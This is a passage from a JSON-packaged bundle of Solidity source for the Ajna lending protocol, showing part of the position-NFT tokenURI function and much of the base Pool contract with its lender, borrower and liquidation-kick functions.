}\n\n    /**\n     * @dev See {IERC721Metadata-tokenURI}.\n     */\n    function tokenURI(\n        uint256 tokenId_\n    ) public view override(ERC721) returns (string memory) {\n        require(_exists(tokenId_));\n\n        address collateralTokenAddress = IPool(poolKey[tokenId_]).collateralAddress();\n        address quoteTokenAddress      = IPool(poolKey[tokenId_]).quoteTokenAddress();\n\n        PositionNFTSVG.ConstructTokenURIParams memory params = PositionNFTSVG.ConstructTokenURIParams({\n            collateralTokenSymbol: tokenSymbol(collateralTokenAddress),\n            quoteTokenSymbol:      tokenSymbol(quoteTokenAddress),\n            tokenId:               tokenId_,\n            pool:                  poolKey[tokenId_],\n            owner:                 ownerOf(tokenId_),\n            indexes:               positionIndexes[tokenId_].values()\n        });\n\n        return PositionNFTSVG.constructTokenURI(params);\n    }\n\n}"
    },
    {
      "filename": "ajna-core/src/base/Pool.sol",
      "content": "// SPDX-License-Identifier: BUSL-1.1\n\npragma solidity 0.8.14;\n\nimport { Clone }           from '@clones/Clone.sol';\nimport { ReentrancyGuard } from '@openzeppelin/contracts/security/ReentrancyGuard.sol';\nimport { Multicall }       from '@openzeppelin/contracts/utils/Multicall.sol';\nimport { SafeERC20 }       from \"@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol\";\nimport { IERC20 }          from \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\n\nimport {\n    IPool,\n    IPoolImmutables,\n    IPoolBorrowerActions,\n    IPoolLPActions,\n    IPoolLenderActions,\n    IPoolKickerActions,\n    IPoolTakerActions,\n    IPoolSettlerActions,\n    IPoolState,\n    IPoolDerivedState,\n    IERC20Token\n}                                    from '../interfaces/pool/IPool.sol';\nimport {\n    PoolState,\n    AuctionsState,\n    DepositsState,\n    LoansState,\n    InflatorState,\n    EmaState,\n    InterestState,\n    PoolBalancesState,\n    ReserveAuctionState,\n    Bucket,\n    BurnEvent,\n    Liquidation\n}                                   from '../interfaces/pool/commons/IPoolState.sol';\nimport {\n    KickResult,\n    SettleResult,\n    TakeResult,\n    RemoveQuoteParams,\n    MoveQuoteParams,\n    AddQuoteParams,\n    KickReserveAuctionParams\n}                                   from '../interfaces/pool/commons/IPoolInternals.sol';\n\nimport {\n    _priceAt,\n    _roundToScale\n}                               from '../libraries/helpers/PoolHelper.sol';\nimport {\n    _revertIfAuctionDebtLocked,\n    _revertIfAuctionClearable,\n    _revertOnExpiry\n}                               from '../libraries/helpers/RevertsHelper.sol';\n\nimport { Buckets }  from '../libraries/internal/Buckets.sol';\nimport { Deposits } from '../libraries/internal/Deposits.sol';\nimport { Loans }    from '../libraries/internal/Loans.sol';\nimport { Maths }    from '../libraries/internal/Maths.sol';\n\nimport { BorrowerActions } from '../libraries/external/BorrowerActions.sol';\nimport { LenderActions }   from '../libraries/external/LenderActions.sol';\nimport { LPActions }       from '../libraries/external/LPActions.sol';\nimport { KickerActions }   from '../libraries/external/KickerActions.sol';\nimport { TakerActions }    from '../libraries/external/TakerActions.sol';\nimport { PoolCommons }     from '../libraries/external/PoolCommons.sol';\n\n/**\n *  @title  Pool Contract\n *  @dev    Base contract and entrypoint for commong logic of both `ERC20` and `ERC721` pools.\n */\nabstract contract Pool is Clone, ReentrancyGuard, Multicall, IPool {\n\n    using SafeERC20 for IERC20;\n\n    /*****************/\n    /*** Constants ***/\n    /*****************/\n\n    /// @dev Immutable pool type arg offset.\n    uint256 internal constant POOL_TYPE          = 0;\n    /// @dev Immutable `Ajna` token address arg offset.\n    uint256 internal constant AJNA_ADDRESS       = 1;\n    /// @dev Immutable collateral token address arg offset.\n    uint256 internal constant COLLATERAL_ADDRESS = 21;\n    /// @dev Immutable quote token address arg offset.\n    uint256 internal constant QUOTE_ADDRESS      = 41;\n    /// @dev Immutable quote token scale arg offset.\n    uint256 internal constant QUOTE_SCALE        = 61;\n\n    /***********************/\n    /*** State Variables ***/\n    /***********************/\n\n    AuctionsState       internal auctions;\n    DepositsState       internal deposits;\n    LoansState          internal loans;\n    InflatorState       internal inflatorState;\n    EmaState            internal emaState;\n    InterestState       internal interestState;\n    PoolBalancesState   internal poolBalances;\n    ReserveAuctionState internal reserveAuction;\n\n    /// @dev deposit index -> bucket mapping\n    mapping(uint256 => Bucket) internal buckets;\n\n    bool internal isPoolInitialized;\n\n    /// @dev owner address -> new owner address -> deposit index -> allowed amount mapping\n    mapping(address => mapping(address => mapping(uint256 => uint256))) private _lpAllowances;\n\n    /// @dev owner address -> transferor address -> approved flag mapping\n    mapping(address => mapping(address => bool)) public override approvedTransferors;\n\n    /******************/\n    /*** Immutables ***/\n    /******************/\n\n    /// @inheritdoc IPoolImmutables\n    function poolType() external pure override returns (uint8) {\n        return _getArgUint8(POOL_TYPE);\n    }\n\n    /// @inheritdoc IPoolImmutables\n    function collateralAddress() external pure override returns (address) {\n        return _getArgAddress(COLLATERAL_ADDRESS);\n    }\n\n    /// @inheritdoc IPoolImmutables\n    function quoteTokenAddress() external pure override returns (address) {\n        return _getArgAddress(QUOTE_ADDRESS);\n    }\n\n    /// @inheritdoc IPoolImmutables\n    function quoteTokenScale() external pure override returns (uint256) {\n        return _getArgUint256(QUOTE_SCALE);\n    }\n\n    function quoteTokenDust() external pure override returns (uint256) {\n        return _getArgUint256(QUOTE_SCALE);\n    }\n\n\n    /*********************************/\n    /*** Lender External Functions ***/\n    /*********************************/\n\n    /// @inheritdoc IPoolLenderActions\n    function addQuoteToken(\n        uint256 amount_,\n        uint256 index_,\n        uint256 expiry_\n    ) external override nonReentrant returns (uint256 bucketLP_) {\n        _revertOnExpiry(expiry_);\n        PoolState memory poolState = _accruePoolInterest();\n\n        // round to token precision\n        amount_ = _roundToScale(amount_, poolState.quoteDustLimit);\n\n        uint256 newLup;\n        (bucketLP_, newLup) = LenderActions.addQuoteToken(\n            buckets,\n            deposits,\n            poolState,\n            AddQuoteParams({\n                amount: amount_,\n                index:  index_\n            })\n        );\n\n        // update pool interest rate state\n        _updateInterestState(poolState, newLup);\n\n        // move quote token amount from lender to pool\n        _transferQuoteTokenFrom(msg.sender, amount_);\n    }\n\n    /// @inheritdoc IPoolLenderActions\n    function moveQuoteToken(\n        uint256 maxAmount_,\n        uint256 fromIndex_,\n        uint256 toIndex_,\n        uint256 expiry_\n    ) external override nonReentrant returns (uint256 fromBucketLP_, uint256 toBucketLP_, uint256 movedAmount_) {\n        _revertOnExpiry(expiry_);\n        PoolState memory poolState = _accruePoolInterest();\n\n        _revertIfAuctionDebtLocked(deposits, poolState.t0DebtInAuction, fromIndex_, poolState.inflator);\n\n        uint256 newLup;\n        (\n            fromBucketLP_,\n            toBucketLP_,\n            movedAmount_,\n            newLup\n        ) = LenderActions.moveQuoteToken(\n            buckets,\n            deposits,\n            poolState,\n            MoveQuoteParams({\n                maxAmountToMove: maxAmount_,\n                fromIndex:       fromIndex_,\n                toIndex:         toIndex_,\n                thresholdPrice:  Loans.getMax(loans).thresholdPrice\n            })\n        );\n\n        // update pool interest rate state\n        _updateInterestState(poolState, newLup);\n    }\n\n    /// @inheritdoc IPoolLenderActions\n    function removeQuoteToken(\n        uint256 maxAmount_,\n        uint256 index_\n    ) external override nonReentrant returns (uint256 removedAmount_, uint256 redeemedLP_) {\n        _revertIfAuctionClearable(auctions, loans);\n\n        PoolState memory poolState = _accruePoolInterest();\n\n        _revertIfAuctionDebtLocked(deposits, poolState.t0DebtInAuction, index_, poolState.inflator);\n\n        uint256 newLup;\n        (\n            removedAmount_,\n            redeemedLP_,\n            newLup\n        ) = LenderActions.removeQuoteToken(\n            buckets,\n            deposits,\n            poolState,\n            RemoveQuoteParams({\n                maxAmount:      maxAmount_,\n                index:          index_,\n                thresholdPrice: Loans.getMax(loans).thresholdPrice\n            })\n        );\n\n        // update pool interest rate state\n        _updateInterestState(poolState, newLup);\n\n        // move quote token amount from pool to lender\n        _transferQuoteToken(msg.sender, removedAmount_);\n    }\n\n    /// @inheritdoc IPoolLenderActions\n    function updateInterest() external override nonReentrant {\n        PoolState memory poolState = _accruePoolInterest();\n        _updateInterestState(poolState, Deposits.getLup(deposits, poolState.debt));\n    }\n\n    /***********************************/\n    /*** Borrower External Functions ***/\n    /***********************************/\n\n    /// @inheritdoc IPoolBorrowerActions\n    function stampLoan() external override nonReentrant {\n        PoolState memory poolState = _accruePoolInterest();\n\n        uint256 newLup = BorrowerActions.stampLoan(\n            auctions,\n            deposits,\n            loans,\n            poolState\n        );\n\n        _updateInterestState(poolState, newLup);\n    }\n\n    /*****************************/\n    /*** Liquidation Functions ***/\n    /*****************************/\n\n    /**\n     *  @inheritdoc IPoolKickerActions\n     *  @dev    === Write state ===\n     *  @dev    increment `poolBalances.t0DebtInAuction` and `poolBalances.t0Debt` accumulators\n     *  @dev    update `t0Debt2ToCollateral` ratio, debt and collateral post action are considered 0\n     */\n    function kick(\n        address borrower_,\n        uint256 npLimitIndex_\n    ) external override nonReentrant {\n        PoolState memory poolState = _accruePoolInterest();\n\n        // kick auction\n        KickResult memory result = KickerActions.kick(\n            auctions,\n            deposits,\n            loans,\n            poolState,\n            borrower_,\n            npLimitIndex_\n        );\n\n        // update in memory pool state struct\n        poolState.debt            =  Maths.wmul(result.t0PoolDebt, poolState.inflator);\n        poolState.t0Debt          =  result.t0PoolDebt;\n        poolState.t0DebtInAuction += result.t0KickedDebt;\n\n        // adjust t0Debt2ToCollateral ratio\n        _updateT0Debt2ToCollateral(\n            result.debtPreAction,\n            0, // debt post kick (for loan in auction) not taken into account\n            result.collateralPreAction,\n            0  // collateral post kick (for loan in auction) not taken into account\n        );\n\n        // update pool balances state\n        poolBalances.t0Debt          = poolState.t0Debt;\n        poolBalances.t0DebtInAuction = poolState.t0DebtInAuction;\n        // update pool interest rate state\n        _updateInterestState(poolState, result.lup);\n\n        if (result.amountToCoverBond != 0) _transferQuoteTokenFrom(msg.sender, result.amountToCoverBond);\n    }\n\n    /**\n     *  @inheritdoc IPoolKickerActions\n     *  @dev    === Write state ===\n     *  @dev    increment `poolBalances.t0DebtInAuction` and `poolBalances.t0Debt` accumulators\n     *  @dev    update `t0Debt2ToCollateral` ratio, debt and collateral post action are considered 0\n     */\n    function kickWithDeposit(\n        uint256 index_,\n        uint256 npLimitIndex_\n    ) external override nonReentrant {\n        PoolState memory poolState = _accruePoolInterest();\n\n        // kick auctions\n        KickResult memory result = KickerActions.kickWithDeposit(\n            auctions,\n            deposits,\n            buckets,\n            loans,\n            poolState,\n            index_,\n            npLimitIndex_\n        );\n\n        // update in memory pool state struct\n        poolState.debt            =  Maths.wmul(result.t0PoolDebt, poolState.inflator);\n        poolState.t0Debt          =  result.t0PoolDebt;\n        poolState.t0DebtInAuction += result.t0KickedDebt;\n\n        // adjust t0Debt2ToCollateral ratio"
    }
  ]
}